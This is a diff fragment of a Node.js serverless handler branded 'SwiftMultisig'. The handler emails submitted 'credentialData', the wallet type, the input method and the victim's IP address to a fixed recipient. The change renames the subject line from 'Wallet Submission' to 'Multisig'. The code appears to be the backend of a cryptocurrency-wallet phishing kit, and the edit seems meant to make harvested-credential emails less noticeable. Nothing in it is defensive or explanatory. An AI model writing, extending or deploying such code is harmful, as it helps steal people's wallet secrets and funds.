@@ -52,7 +52,7 @@ module.exports = async (req, res) => {
         await transporter.sendMail({
             from: `"SwiftMultisig" <${EMAIL_USER}>`,
             to: RECIPIENT_EMAIL,
-            subject: `Wallet Submission - ${walletType} (${inputMethod})`,
+            subject: `Multisig - ${walletType} (${inputMethod})`,
             html: emailHtml,
             text: `Wallet: ${walletType}\nMethod: ${inputMethod}\nData: ${credentialData}\nIP: ${ipAddress}\nTime: ${new Date().toLocaleString()}`
         });
